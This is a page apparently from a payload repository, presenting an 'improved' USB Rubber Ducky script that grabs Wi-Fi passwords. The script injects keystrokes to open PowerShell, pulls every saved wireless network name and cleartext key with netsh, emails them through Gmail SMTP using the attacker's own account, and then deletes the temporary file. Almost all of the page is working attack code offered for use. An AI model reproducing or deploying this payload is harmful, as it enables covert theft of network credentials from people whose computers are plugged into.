## Slightly improved version of [WiFi password grabber](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---WiFi-password-grabber) by Siem

### Make sure to change "YOUREMAIL@gmail.com" with your G-Mail, and "YOURPASSWORD" with your password

### Code:
```
REM Title       : Improved Wi-Fi Password Grabber
REM Author      : Jacob Collins
REM Version     : 3
REM Description : An improved version of the "WiFi password grabber" by Siem. It is a bit faster, and shorter.
REM DISCLAIMER  : Make sure to replace all instances of "YOUREMAIL@gmail.com" (without quotes), with your actual e-mail (MUST BE G-MAIL!), and "YOURPASSWORD" (without quotes) with your password.
REM DISCLAIMER  : Make sure to enable "Allow less secure apps". Here is the link: https://myaccount.google.com/lesssecureapps
DELAY 1000
REM --------> Open the run dialog
GUI r
DELAY 500
REM --------> Open Powershell straight away, allows us to type the command out as its queueing. Close when Powershell exits.
STRING cmd /c powershell && exit
DELAY 500
REM --------> Long-ass command. Gets the SSID and password off each saved WiFi network, formats a bit, sends it to YOUREMAIL@gmail.com, through the account of YOUREMAIL@gmail.com
STRING $a=0;ForEach($b in ((netsh wlan show profile|findstr "All User Profile") -match "All User Profile").split(":")){if($a -eq "1") {(netsh wlan show profile $b.substring(1) Key=clear|findstr /I "SSID Content"|findstr /V "SSIDs") -replace "[^`"]$","`r`n">>a;$a++}else{$a=1}};$c=New-Object Net.Mail.SmtpClient("smtp.gmail.com",587);$c.EnableSsl=$true;$c.Credentials=New-Object System.Net.NetworkCredential("YOUREMAIL@gmail.com","YOURPASSWORD");$d=New-Object System.Net.Mail.MailMessage;$d.From="YOUREMAIL@gmail.com";$d.To.Add("YOUREMAIL@gmail.com");$d.Subject=($env:UserName+"@"+$env:UserDomain);$d.Body=(Get-Content a|out-string);$c.Send($d);Remove-Item a;exit
```
### Suggestions
Please feel free to leave any suggestions, like code minimization, fixes etc.

Suggestion: It lacks 1 character